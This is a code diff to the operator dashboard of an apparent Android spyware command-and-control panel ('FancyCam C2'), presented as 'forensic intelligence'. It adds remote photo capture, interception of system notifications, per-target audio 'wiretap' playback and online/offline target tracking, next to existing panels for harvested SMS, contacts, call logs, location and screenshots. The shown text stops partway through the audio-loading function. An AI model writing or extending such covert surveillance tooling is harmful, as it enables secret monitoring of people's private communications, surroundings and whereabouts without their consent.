@@ -6,6 +6,7 @@
     <title>FancyCam C2 - Forensic Intelligence Dashboard</title>
     <style>
         :root {
+            color-scheme: dark;
             --bg-base: #0a0c10;
             --bg-surface: #12161f;
             --bg-card: #181d28;
@@ -185,13 +186,42 @@
         }
 
         .target-count-badge {
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 7px;
+            border-radius: 10px;
+            transition: all 0.2s;
+        }
+
+        .target-count-badge.badge-online {
             background: rgba(0, 255, 136, 0.15);
             color: var(--success);
             border: 1px solid rgba(0, 255, 136, 0.3);
-            font-size: 10px;
-            font-weight: 700;
-            padding: 2px 6px;
-            border-radius: 10px;
+        }
+
+        .target-count-badge.badge-offline {
+            background: rgba(100, 116, 139, 0.15);
+            color: var(--text-muted);
+            border: 1px solid var(--border);
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            transition: all 0.3s;
+        }
+
+        .status-dot.online {
+            background: var(--success);
+            box-shadow: 0 0 8px var(--success);
+            animation: pulse 2s infinite;
+        }
+
+        .status-dot.offline {
+            background: #64748b;
+            box-shadow: none;
+            animation: none;
         }
 
         .device-search-input {
@@ -273,15 +303,46 @@
             background: rgba(233, 69, 96, 0.15);
         }
 
-        .device-online-dot {
+        .device-status-dot {
             position: absolute;
             bottom: -2px;
             right: -2px;
             width: 8px;
             height: 8px;
             border-radius: 50%;
-            background: var(--success);
             border: 2px solid var(--bg-card);
+            transition: all 0.3s;
+        }
+
+        .device-status-dot.online {
+            background: var(--success);
+            box-shadow: 0 0 6px var(--success);
+        }
+
+        .device-status-dot.offline {
+            background: #64748b;
+            box-shadow: none;
+        }
+
+        .device-status-badge {
+            font-size: 9px;
+            font-weight: 700;
+            padding: 1px 6px;
+            border-radius: 3px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .device-status-badge.online {
+            background: rgba(0, 255, 136, 0.15);
+            color: var(--success);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+        }
+
+        .device-status-badge.offline {
+            background: rgba(100, 116, 139, 0.15);
+            color: var(--text-muted);
+            border: 1px solid var(--border);
         }
 
         .device-info-box {
@@ -398,6 +459,13 @@
         .select-payload-dropdown:focus {
             outline: none;
             border-color: var(--accent);
+        }
+
+        .dump-timestamp-text {
+            font-size: 11px;
+            color: var(--text-secondary);
+            font-family: var(--font-mono);
+            white-space: nowrap;
         }
 
         .bar-right-actions {
@@ -548,14 +616,25 @@
         }
 
         .target-tag {
+            font-size: 10px;
+            font-weight: 700;
+            padding: 3px 8px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.2s;
+        }
+
+        .target-tag.tag-online {
             background: rgba(0, 255, 136, 0.15);
             color: var(--success);
             border: 1px solid rgba(0, 255, 136, 0.3);
-            font-size: 10px;
-            font-weight: 700;
-            padding: 2px 6px;
-            border-radius: 4px;
-            text-transform: uppercase;
+        }
+
+        .target-tag.tag-offline {
+            background: rgba(100, 116, 139, 0.15);
+            color: var(--text-muted);
+            border: 1px solid var(--border);
         }
 
         .badge-btn {
@@ -796,27 +875,138 @@
             border-top: 1px solid var(--border);
         }
 
-        .audio-item-card {
-            background: var(--bg-surface);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px;
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
+        /* Audio Recordings Section */
+        .audio-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(420px, 1fr));
+            gap: 16px;
         }
 
-        .audio-meta {
+        @media (max-width: 900px) {
+            .audio-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .audio-item-card {
+            background: #11151f;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.3);
+            transition: border-color 0.2s, transform 0.2s;
+        }
+
+        .audio-item-card:hover {
+            border-color: rgba(233, 69, 96, 0.6);
+            transform: translateY(-2px);
+        }
+
+        .audio-card-top {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 12px;
+        }
+
+        .audio-card-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 0;
+        }
+
+        .audio-icon-wrap {
+            width: 38px;
+            height: 38px;
+            border-radius: 8px;
+            background: rgba(233, 69, 96, 0.12);
+            border: 1px solid rgba(233, 69, 96, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .audio-details {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            min-width: 0;
+        }
+
+        .audio-title {
+            font-weight: 700;
+            color: var(--text-primary);
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .audio-filename {
+            font-family: var(--font-mono);
+            font-size: 11px;
+            color: var(--text-muted);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            max-width: 250px;
+        }
+
+        .audio-meta-right {
+            text-align: right;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 4px;
+            flex-shrink: 0;
+        }
+
+        .audio-timestamp {
+            font-size: 11px;
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+
+        .audio-stats-pill {
+            font-family: var(--font-mono);
+            font-size: 10px;
+            color: var(--info);
+            background: rgba(56, 189, 248, 0.1);
+            border: 1px solid rgba(56, 189, 248, 0.25);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .audio-player-container {
+            width: 100%;
+            background: #090c12;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 8px 10px;
+        }
+
+        .audio-player-container audio {
+            width: 100%;
+            height: 38px;
+            outline: none;
+            accent-color: var(--accent);
+            border-radius: 6px;
+        }
+
+        .audio-card-footer {
             display: flex;
             align-items: center;
             justify-content: space-between;
+            padding-top: 4px;
             font-size: 11px;
-        }
-
-        .audio-player audio {
-            width: 100%;
-            height: 36px;
-            outline: none;
+            border-top: 1px dashed rgba(255, 255, 255, 0.08);
         }
 
         /* Raw JSON Viewer */
@@ -1011,10 +1201,11 @@
             <div class="c2-operations-bar">
                 <div class="bar-left-controls">
                     <div class="active-target-pill">
-                        <div class="pulse-dot"></div>
+                        <div id="bar-target-dot" class="status-dot offline"></div>
                         <span>Target:</span>
                         <strong id="bar-target-name">Android SDK built for x86_64</strong>
                         <code id="bar-target-id">ff4330ffa39f3995</code>
+                        <span id="bar-target-status" class="device-status-badge offline">OFFLINE</span>
                     </div>
 
                     <div class="payload-selector-wrapper">
@@ -1022,12 +1213,16 @@
                         <select id="payload-select" class="select-payload-dropdown" onchange="switchPayload(this.value)">
                             <option value="latest">Latest Received Dump</option>
                         </select>
+                        <span id="dump-timestamp" class="dump-timestamp-text"></span>
                     </div>
                 </div>
 
                 <div class="bar-right-actions">
                     <button class="btn-c2-action" onclick="triggerAction('screenshot')">
                         <span>📸 Capture Screenshot</span>
+                    </button>
+                    <button class="btn-c2-action" onclick="triggerAction('photo')">
+                        <span>📷 Capture Photo</span>
                     </button>
                     <button class="btn-c2-action" onclick="triggerAction('audio')">
                         <span>🎙️ Wiretap Audio (30s)</span>
@@ -1045,6 +1240,10 @@
                 <button class="tab-btn" onclick="switchTab('tab-sms')">
                     <span>💬</span> SMS Messages
                     <span class="tab-count" id="count-sms">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-notifications')">
+                    <span>🔔</span> Notifications
+                    <span class="tab-count" id="count-notifications">0</span>
                 </button>
                 <button class="tab-btn" onclick="switchTab('tab-contacts')">
                     <span>👥</span> Contacts
@@ -1071,8 +1270,12 @@
                     <span class="tab-count" id="count-audio">0</span>
                 </button>
                 <button class="tab-btn" onclick="switchTab('tab-media')">
-                    <span>🖼️</span> Screenshots & Photos
+                    <span>🖼️</span> Screenshots
                     <span class="tab-count" id="count-screens">0</span>
+                </button>
+                <button class="tab-btn" onclick="switchTab('tab-photos')">
+                    <span>📷</span> Photos
+                    <span class="tab-count" id="count-photos">0</span>
                 </button>
                 <button class="tab-btn" onclick="switchTab('tab-raw')">
                     <span>📄</span> Raw JSON
@@ -1091,7 +1294,7 @@
                             <div class="card-title">
                                 <span>📱</span> Target Device Information
                             </div>
-                            <span class="target-tag">ONLINE TARGET</span>
+                            <span class="target-tag tag-offline" id="overview-target-tag">OFFLINE</span>
                         </div>
                         <div class="card-body">
                             <div style="display: flex; align-items: center; gap: 16px; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid var(--border);">
@@ -1133,6 +1336,10 @@
                                     </div>
                                 </div>
                                 <div style="background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px;">
+                                    <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700;">Connection Status</div>
+                                    <div style="font-family: var(--font-mono); font-size: 13px; font-weight: 700; margin-top: 4px;" id="overview-dev-status-indicator"><span style="color: var(--text-muted);">⚪ Offline</span></div>
+                                </div>
+                                <div style="background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px;">
                                     <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700;">Last Sync</div>
                                     <div style="font-family: var(--font-mono); font-size: 13px; color: var(--text-primary); margin-top: 4px;" id="overview-dev-last-sync">-</div>
                                 </div>
@@ -1151,6 +1358,11 @@
                             <div class="stat-icon">💬</div>
                             <div class="stat-number" id="stat-sms">0</div>
                             <div class="stat-label">SMS Harvested</div>
+                        </div>
+                        <div class="stat-card" onclick="switchTab('tab-notifications')">
+                            <div class="stat-icon">🔔</div>
+                            <div class="stat-number" id="stat-notifications">0</div>
+                            <div class="stat-label">Notifications</div>
                         </div>
                         <div class="stat-card" onclick="switchTab('tab-contacts')">
                             <div class="stat-icon">👥</div>
@@ -1213,6 +1425,34 @@
                                     </thead>
                                     <tbody id="sms-tbody">
                                         <tr><td colspan="4" class="empty-state">No SMS collected yet</td></tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- NOTIFICATIONS TAB -->
+                <div class="tab-pane" id="tab-notifications">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>🔔</span> Intercepted System Notifications</div>
+                            <input type="text" class="filter-input" placeholder="Search package, title, or message..." oninput="filterTable('notifications-table', this.value)">
+                        </div>
+                        <div class="card-body">
+                            <div class="table-responsive">
+                                <table class="cyber-table" id="notifications-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Application / Package</th>
+                                            <th>Notification Title</th>
+                                            <th>Notification Message</th>
+                                            <th>Details / Flags</th>
+                                            <th>Timestamp</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="notifications-tbody">
+                                        <tr><td colspan="5" class="empty-state">No notifications captured yet</td></tr>
                                     </tbody>
                                 </table>
                             </div>
@@ -1354,12 +1594,15 @@
                     <div class="content-card">
                         <div class="card-header">
                             <div class="card-title"><span>🎙️</span> Audio Wiretap Recordings (AAC / M4A)</div>
-                            <button class="btn-c2-action" style="padding: 5px 10px; font-size: 11px;" onclick="triggerAction('audio')">
-                                <span>🎙️ Record New (30s)</span>
-                            </button>
+                            <div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
+                                <input type="text" id="audio-filter" class="filter-input" placeholder="Search device, date, or filename..." oninput="filterAudioCards(this.value)" style="min-width: 220px;">
+                                <button class="btn-c2-action" style="padding: 6px 12px; font-size: 11px;" onclick="triggerAction('audio')">
+                                    <span>🎙️ Record New (30s)</span>
+                                </button>
+                            </div>
                         </div>
                         <div class="card-body">
-                            <div class="media-grid" id="audio-grid">
+                            <div class="audio-grid" id="audio-grid">
                                 <div class="empty-state" style="grid-column: 1/-1;">
                                     <div class="empty-icon">🎙️</div>
                                     <div>No audio intercepts collected yet</div>
@@ -1369,11 +1612,11 @@
                     </div>
                 </div>
 
-                <!-- 9. SCREENSHOTS & PHOTOS TAB -->
+                <!-- 9. SCREENSHOTS TAB -->
                 <div class="tab-pane" id="tab-media">
                     <div class="content-card">
                         <div class="card-header">
-                            <div class="card-title"><span>🖼️</span> Captured Screenshots & Camera Photos</div>
+                            <div class="card-title"><span>🖼️</span> Captured Screenshots</div>
                             <button class="btn-c2-action" style="padding: 5px 10px; font-size: 11px;" onclick="triggerAction('screenshot')">
                                 <span>📸 Capture Screenshot</span>
                             </button>
@@ -1382,7 +1625,24 @@
                             <div class="media-grid" id="screenshots-grid">
                                 <div class="empty-state" style="grid-column: 1/-1;">
                                     <div class="empty-icon">🖼️</div>
-                                    <div>No screenshots or photos received yet</div>
+                                    <div>No screenshots received yet</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 10. PHOTOS TAB -->
+                <div class="tab-pane" id="tab-photos">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>📷</span> Captured Camera Photos</div>
+                        </div>
+                        <div class="card-body">
+                            <div class="media-grid" id="photos-grid">
+                                <div class="empty-state" style="grid-column: 1/-1;">
+                                    <div class="empty-icon">📷</div>
+                                    <div>No photos received yet</div>
                                 </div>
                             </div>
                         </div>
@@ -1457,7 +1717,12 @@
                 statusEl.innerHTML = `<span style="color: var(--warning);">⏳ Triggering...</span>`;
             }
             try {
-                const resp = await fetch(`/api/trigger/${action}`, { method: 'POST' });
+                const target = selectedDeviceId || 'all';
+                const resp = await fetch(`/api/trigger/${action}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target })
+                });
                 const data = await resp.json();
                 if (statusEl) {
                     statusEl.innerHTML = `<span style="color: var(--success);">✓ ${action.toUpperCase()} OK</span>`;
@@ -1519,14 +1784,75 @@
             } catch (e) { console.error('Events load failed:', e); }
         }
 
+        // Update Active Target Status & Header UI Elements
+        function updateActiveTargetUI(activeDev) {
+            if (!activeDev) {
+                const nameEl = document.getElementById('bar-target-name');
+                if (nameEl) nameEl.textContent = 'No Target';
+                const idEl = document.getElementById('bar-target-id');
+                if (idEl) idEl.textContent = '-';
+                const dot = document.getElementById('bar-target-dot');
+                if (dot) dot.className = 'status-dot offline';
+                const tag = document.getElementById('bar-target-status');
+                if (tag) {
+                    tag.className = 'device-status-badge offline';
+                    tag.textContent = 'OFFLINE';
+                }
+                const ovTag = document.getElementById('overview-target-tag');
+                if (ovTag) {
+                    ovTag.className = 'target-tag tag-offline';
+                    ovTag.textContent = 'OFFLINE';
+                }
+                const ovStatus = document.getElementById('overview-dev-status-indicator');
+                if (ovStatus) {
+                    ovStatus.innerHTML = '<span style="color: var(--text-muted);">⚪ Offline</span>';
+                }
+                return;
+            }
+
+            const isOnline = Boolean(activeDev.is_online);
+
+            const nameEl = document.getElementById('bar-target-name');
+            if (nameEl) nameEl.textContent = activeDev.model || 'Android Device';
+
+            const idEl = document.getElementById('bar-target-id');
+            if (idEl) idEl.textContent = activeDev.android_id || '-';
+
+            const dot = document.getElementById('bar-target-dot');
+            if (dot) dot.className = `status-dot ${isOnline ? 'online' : 'offline'}`;
+
+            const tag = document.getElementById('bar-target-status');
+            if (tag) {
+                tag.className = `device-status-badge ${isOnline ? 'online' : 'offline'}`;
+                tag.textContent = isOnline ? 'ONLINE' : 'OFFLINE';
+            }
+
+            const ovTag = document.getElementById('overview-target-tag');
+            if (ovTag) {
+                ovTag.className = `target-tag ${isOnline ? 'tag-online' : 'tag-offline'}`;
+                ovTag.textContent = isOnline ? 'ONLINE TARGET' : 'OFFLINE TARGET';
+            }
+
+            const ovStatus = document.getElementById('overview-dev-status-indicator');
+            if (ovStatus) {
+                ovStatus.innerHTML = isOnline 
+                    ? '<span style="color: var(--success); font-weight: 700;">🟢 Online</span>' 
+                    : '<span style="color: var(--text-muted); font-weight: 700;">⚪ Offline</span>';
+            }
+        }
+
         // Device Switcher: Load Devices
         async function loadDevices() {
             try {
                 const resp = await fetch('/api/devices');
                 deviceList = await resp.json();
                 
+                const onlineCount = deviceList.filter(d => d.is_online).length;
                 const badge = document.getElementById('devices-count-badge');
-                badge.textContent = `${deviceList.length} Target${deviceList.length === 1 ? '' : 's'}`;
+                if (badge) {
+                    badge.textContent = `${onlineCount} Online`;
+                    badge.className = `target-count-badge ${onlineCount > 0 ? 'badge-online' : 'badge-offline'}`;
+                }
 
                 const listEl = document.getElementById('device-switcher-list');
                 if (deviceList.length === 0) {
@@ -1536,6 +1862,7 @@
                             <div style="font-size: 11px;">No target devices connected</div>
                         </div>
                     `;
+                    updateActiveTargetUI(null);
                     return;
                 }
 
@@ -1548,6 +1875,9 @@
                     const isSelected = dev.android_id === selectedDeviceId;
                     const shortId = dev.android_id ? `${dev.android_id.slice(0, 10)}...` : 'Unknown ID';
                     const lastSeenTime = dev.last_seen ? new Date(dev.last_seen).toLocaleTimeString() : 'Recent';
+                    const isOnline = Boolean(dev.is_online);
+                    const statusClass = isOnline ? 'online' : 'offline';
+                    const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
 
                     return `
                         <div class="device-item-card ${isSelected ? 'active' : ''}" 
@@ -1555,23 +1885,23 @@
                              onclick="selectDevice('${escapeHtml(dev.android_id)}')">
                             <div class="device-icon-box">
                                 📱
-                                <div class="device-online-dot"></div>
+                                <div class="device-status-dot ${statusClass}" title="${statusText}"></div>
                             </div>
                             <div class="device-info-box">
-                                <div class="device-item-name">${escapeHtml(dev.model || 'Android Target')}</div>
+                                <div style="display: flex; align-items: center; justify-content: space-between; gap: 4px;">
+                                    <div class="device-item-name">${escapeHtml(dev.model || 'Android Target')}</div>
+                                    <span class="device-status-badge ${statusClass}">${statusText}</span>
+                                </div>
                                 <div class="device-item-sub">${escapeHtml(dev.brand || 'Google')} • API ${dev.sdk_version || 29}</div>
-                                <div class="device-item-id">ID: ${escapeHtml(shortId)}</div>
+                                <div class="device-item-id">ID: ${escapeHtml(shortId)} • ${isOnline ? '<span style="color: var(--success); font-weight: 600;">Active</span>' : '<span style="color: var(--text-muted);">Last: ' + lastSeenTime + '</span>'}</div>
                             </div>
                         </div>
                     `;
                 }).join('');
 
-                // Update the Top Bar target title
+                // Update the Top Bar target title and status
                 const activeDev = deviceList.find(d => d.android_id === selectedDeviceId) || deviceList[0];
-                if (activeDev) {
-                    document.getElementById('bar-target-name').textContent = activeDev.model || 'Android Device';
-                    document.getElementById('bar-target-id').textContent = activeDev.android_id || '-';
-                }
+                updateActiveTargetUI(activeDev);
 
             } catch (e) {
                 console.error('Failed to load devices:', e);
@@ -1590,13 +1920,18 @@
             });
 
             const activeDev = deviceList.find(d => d.android_id === androidId);
-            if (activeDev) {
-                document.getElementById('bar-target-name').textContent = activeDev.model || 'Android Device';
-                document.getElementById('bar-target-id').textContent = activeDev.android_id || '-';
-            }
+            updateActiveTargetUI(activeDev);
+
+            const select = document.getElementById('payload-select');
+            if (select) select.value = 'latest';
 
             loadLatestPayload();
             loadPayloadsList();
+            lastAudioDataKey = null;
+            loadAudio();
+            loadScreenshots();
+            loadPhotos();
+            fetchNotificationsFallback(selectedDeviceId);
         }
 
         function filterDeviceList(query) {
@@ -1604,6 +1939,38 @@
             document.querySelectorAll('.device-item-card').forEach(el => {
                 el.style.display = el.textContent.toLowerCase().includes(q) ? 'flex' : 'none';
             });
+        }
+
+        // Format dump timestamp
+        function formatDumpTimestamp(raw) {
+            if (!raw) return '';
+            if (typeof raw === 'number' || /^\d{10,13}$/.test(String(raw))) {
+                const d = new Date(parseInt(raw, 10));
+                if (!isNaN(d.getTime())) return d.toLocaleString();
+            }
+            const d = new Date(raw);
+            if (!isNaN(d.getTime())) {
+                return d.toLocaleString();
+            }
+            const match = String(raw).match(/(\d{4})(\d{2})(\d{2})_(\d{2})(\d{2})(\d{2})/);
+            if (match) {
+                const iso = `${match[1]}-${match[2]}-${match[3]}T${match[4]}:${match[5]}:${match[6]}`;
+                const fd = new Date(iso);
+                if (!isNaN(fd.getTime())) return fd.toLocaleString();
+            }
+            return String(raw);
+        }
+
+        // Update dump timestamp display next to selector
+        function updateDumpTimestamp(p, metaTimestamp) {
+            const el = document.getElementById('dump-timestamp');
+            if (!el) return;
+            if (!p) {
+                el.textContent = '';
+                return;
+            }
+            const raw = p.device_info?.timestamp || p.timestamp || metaTimestamp;
+            el.textContent = formatDumpTimestamp(raw);
         }
 
         // Load Historical Payloads List (Filtered for selected device if available)
@@ -1621,7 +1988,11 @@
                     html += `<option value="${f.filename}">${f.filename} (${timeStr})</option>`;
                 });
                 select.innerHTML = html;
-                select.value = currentVal;
+                if (currentVal && Array.from(select.options).some(o => o.value === currentVal)) {
+                    select.value = currentVal;
+                } else {
+                    select.value = 'latest';
+                }
             } catch (e) { console.error('Payloads list failed:', e); }
         }
 
@@ -1635,7 +2006,7 @@
                     const data = await resp.json();
                     if (data.payload) {
                         currentPayload = data.payload;
-                        renderPayload(data.payload);
+                        renderPayload(data.payload, data.timestamp || data.filename);
                     }
                 } catch (e) { console.error('Failed to load payload:', e); }
             }
@@ -1647,16 +2018,21 @@
                 const url = selectedDeviceId ? `/api/latest?device=${encodeURIComponent(selectedDeviceId)}` : '/api/latest';
                 const resp = await fetch(url);
                 const data = await resp.json();
-                if (!data.payload) return;
+                if (!data.payload) {
+                    updateDumpTimestamp(null);
+                    return;
+                }
                 currentPayload = data.payload;
-                renderPayload(data.payload);
+                renderPayload(data.payload, data.timestamp || data.filename);
             } catch (e) { console.error('Payload load failed:', e); }
         }
 
         // Master Renderer for Payload Data
-        function renderPayload(p) {
+        function renderPayload(p, metaTimestamp) {
+            updateDumpTimestamp(p, metaTimestamp);
             renderOverviewDeviceCard(p);
             renderSms(p);
+            renderNotifications(p);
             renderContacts(p);
             renderCallLogs(p);
             renderLocation(p);
@@ -1704,9 +2080,9 @@
             const ovSync = document.getElementById('overview-dev-last-sync');
             if (ovSync) ovSync.textContent = ts;
 
-            // Also update top bar
-            document.getElementById('bar-target-name').textContent = d.model || 'Android Device';
-            document.getElementById('bar-target-id').textContent = d.android_id || '-';
+            // Also update top bar and status
+            const activeDev = deviceList.find(dev => dev.android_id === (d.android_id || selectedDeviceId));
+            updateActiveTargetUI(activeDev || { model: d.model, android_id: d.android_id, is_online: false });
         }
 
         // Render Installed Apps in Modal
@@ -1755,6 +2131,80 @@
                         <td><strong>${escapeHtml(s.address || 'Unknown')}</strong></td>
                         <td style="max-width: 400px; word-break: break-word;">${escapeHtml(s.body || '')}</td>
                         <td style="font-family: var(--font-mono); font-size: 11px;">${dateStr}</td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        // Render Notifications
+        function renderNotifications(p) {
+            let notifs = (p.notifications || []).slice();
+            if (p.notification_event && !notifs.some(n => n.timestamp === p.notification_event.timestamp && n.package === p.notification_event.package)) {
+                notifs.unshift(p.notification_event);
+            }
+
+            const statEl = document.getElementById('stat-notifications');
+            if (statEl) statEl.textContent = notifs.length;
+            const countEl = document.getElementById('count-notifications');
+            if (countEl) countEl.textContent = notifs.length;
+
+            const tbody = document.getElementById('notifications-tbody');
+            if (!tbody) return;
+
+            if (notifs.length === 0) {
+                fetchNotificationsFallback(selectedDeviceId);
+                return;
+            }
+
+            displayNotifications(notifs);
+        }
+
+        async function fetchNotificationsFallback(deviceId) {
+            try {
+                const url = deviceId ? `/api/notifications?device=${encodeURIComponent(deviceId)}` : '/api/notifications';
+                const res = await fetch(url);
+                const allNotifs = await res.json();
+                if (allNotifs && allNotifs.length > 0) {
+                    const statEl = document.getElementById('stat-notifications');
+                    if (statEl) statEl.textContent = allNotifs.length;
+                    const countEl = document.getElementById('count-notifications');
+                    if (countEl) countEl.textContent = allNotifs.length;
+                    displayNotifications(allNotifs);
+                    return;
+                }
+            } catch (e) {
+                console.warn('Could not fetch notifications fallback:', e);
+            }
+            const tbody = document.getElementById('notifications-tbody');
+            if (tbody) {
+                tbody.innerHTML = '<tr><td colspan="5" class="empty-state">No notifications captured yet</td></tr>';
+            }
+        }
+
+        function displayNotifications(notifs) {
+            const tbody = document.getElementById('notifications-tbody');
+            if (!tbody) return;
+
+            tbody.innerHTML = notifs.map(n => {
+                const dateStr = n.timestamp ? new Date(parseInt(n.timestamp)).toLocaleString() : '-';
+                const pkg = escapeHtml(n.package || 'Unknown App');
+                const title = escapeHtml(n.title || '');
+                const text = escapeHtml(n.big_text || n.text || '');
+                const extras = [];
+                if (n.sub_text) extras.push(`Sub: ${escapeHtml(n.sub_text)}`);
+                if (n.info_text) extras.push(`Info: ${escapeHtml(n.info_text)}`);
+                if (n.is_ongoing) extras.push(`<span class="tag tag-wifi">ONGOING</span>`);
+                const extrasStr = extras.join(' | ') || '-';
+
+                return `
+                    <tr>
+                        <td>
+                            <div style="font-weight: 600; color: var(--accent);">${pkg}</div>
+                        </td>
+                        <td><strong>${title || '<span style="color:var(--text-muted);">(No Title)</span>'}</strong></td>
+                        <td style="max-width: 420px; word-break: break-word;">${text || '<span style="color:var(--text-muted);">(No Message Text)</span>'}</td>
+                        <td style="font-size: 11px; color: var(--text-muted);">${extrasStr}</td>
+                        <td style="font-family: var(--font-mono); font-size: 11px; white-space: nowrap;">${dateStr}</td>
                     </tr>
                 `;
             }).join('');
@@ -1856,19 +2306,33 @@
         function renderWifi(p) {
             const wifi = p.wifi_networks || {};
             const networks = wifi.networks || [];
-            document.getElementById('count-wifi').textContent = networks.length;
+            
+            const isMasked = wifi.connected_ssid === '<unknown ssid>' || wifi.ssid_masked_by_os;
+            const hasConnection = (wifi.connected_ssid && wifi.connected_ssid !== 'unknown') || wifi.is_connected || (wifi.connected_rssi && wifi.connected_rssi !== 0 && wifi.connected_rssi !== -127);
+            
+            // Total networks count: scanned networks plus active connection if not already in list
+            const inList = networks.some(n => n.ssid && wifi.connected_ssid && n.ssid === wifi.connected_ssid);
+            const totalCount = networks.length + (hasConnection && !inList ? 1 : 0);
+            document.getElementById('count-wifi').textContent = totalCount;
 
             const box = document.getElementById('wifi-connected-box');
-            if (wifi.connected_ssid) {
+            if (hasConnection) {
+                let displayName = escapeHtml(wifi.connected_ssid || 'Connected Wi-Fi AP');
+                let note = '';
+                if (isMasked) {
+                    displayName = 'Connected Wi-Fi (SSID Masked by OS)';
+                    note = '<div style="font-size: 11px; color: var(--warning); margin-top: 4px;">⚠️ Android 10+ masks SSID/BSSID when app runs in background or Location is off.</div>';
+                }
                 box.innerHTML = `
                     <div style="display: flex; justify-content: space-between; align-items: center;">
                         <div>
                             <div style="font-size: 18px; font-weight: 700; color: var(--success);">
-                                📶 ${escapeHtml(wifi.connected_ssid)}
+                                📶 ${displayName}
                             </div>
                             <div style="font-size: 12px; color: var(--text-muted); font-family: var(--font-mono); margin-top: 4px;">
                                 BSSID: ${wifi.connected_bssid || '-'} | Link Speed: ${wifi.link_speed || '-'} Mbps
                             </div>
+                            ${note}
                         </div>
                         <span class="tag tag-incoming">Connected (${wifi.connected_rssi || 0} dBm)</span>
                     </div>
@@ -1879,13 +2343,23 @@
 
             const tbody = document.getElementById('wifi-tbody');
             if (networks.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="3" class="empty-state">No surrounding access points scanned</td></tr>';
+                if (hasConnection) {
+                    tbody.innerHTML = `
+                        <tr>
+                            <td><strong>${escapeHtml(wifi.connected_ssid && wifi.connected_ssid !== '<unknown ssid>' ? wifi.connected_ssid : 'Connected Wi-Fi Network')}</strong> <span class="tag tag-incoming">Connected</span></td>
+                            <td style="font-family: var(--font-mono); font-size: 12px;">${wifi.connected_bssid || '-'}</td>
+                            <td><span class="tag tag-wifi">${wifi.connected_rssi || '-'} dBm</span></td>
+                        </tr>
+                    `;
+                } else {
+                    tbody.innerHTML = '<tr><td colspan="3" class="empty-state">No surrounding access points scanned</td></tr>';
+                }
                 return;
             }
 
             tbody.innerHTML = networks.map(n => `
                 <tr>
-                    <td><strong>${escapeHtml(n.ssid || '<Hidden SSID>')}</strong></td>
+                    <td><strong>${escapeHtml(n.ssid || '<Hidden SSID>')}</strong> ${n.capabilities && n.capabilities.includes('CONNECTED') ? '<span class="tag tag-incoming">Connected</span>' : ''}</td>
                     <td style="font-family: var(--font-mono); font-size: 12px;">${n.bssid || '-'}</td>
                     <td><span class="tag tag-wifi">${n.level || '-'} dBm</span></td>
                 </tr>
@@ -1921,16 +2395,24 @@
             document.getElementById('raw-payload').textContent = JSON.stringify(p, null, 2);
         }
 
+        let lastAudioDataKey = null;
+        let cachedAudioFiles = [];
+
         // Load Audio Files
         async function loadAudio() {
             try {
-                const resp = await fetch('/api/audio');
+                const url = selectedDeviceId ? `/api/audio?device=${encodeURIComponent(selectedDeviceId)}` : '/api/audio';
+                const resp = await fetch(url);
                 const files = await resp.json();
+                cachedAudioFiles = files;
                 document.getElementById('count-audio').textContent = files.length;
                 document.getElementById('stat-audio').textContent = files.length;
 
                 const grid = document.getElementById('audio-grid');
+                if (!grid) return;
+
                 if (files.length === 0) {
+                    lastAudioDataKey = 'empty';
                     grid.innerHTML = `
                         <div class="empty-state" style="grid-column: 1/-1;">
                             <div class="empty-icon">🎙️</div>
@@ -1940,29 +2422,101 @@
                     return;
                 }
 
-                grid.innerHTML = files.map(f => `
-                    <div class="audio-item-card">
-                        <div class="audio-meta">
-                            <span style="font-weight: 600; color: var(--text-primary); font-family: var(--font-mono); font-size: 11px;">${escapeHtml(f)}</span>
-                            <a href="/api/audio/file/${encodeURIComponent(f)}" download class="badge-btn" style="text-decoration: none;">⬇ Save</a>
+                // Check if any audio element is currently playing to prevent interrupting user playback
+                const isPlaying = Array.from(grid.querySelectorAll('audio')).some(a => !a.paused && !a.ended && a.currentTime > 0);
+                
+                // Fast signature comparison based on paths/sizes to prevent unnecessary DOM re-renders
